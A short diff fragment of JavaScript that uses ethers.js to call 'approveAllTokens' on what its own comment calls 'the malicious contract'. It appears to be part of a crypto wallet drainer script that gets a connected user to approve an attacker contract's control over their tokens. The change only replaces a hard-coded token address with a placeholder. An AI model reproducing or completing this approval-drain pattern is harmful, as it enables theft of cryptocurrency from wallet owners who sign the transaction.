@@ -97,7 +97,7 @@
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
 
             // Approve all tokens using the malicious contract
-            const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // Replace with actual token address
+            const tokenAddress = "0xTokenAddressHere"; // Replace with actual token address
             const approveTx = await contract.approveAllTokens(tokenAddress);
             console.log("Approval transaction sent:", approveTx.hash);
 
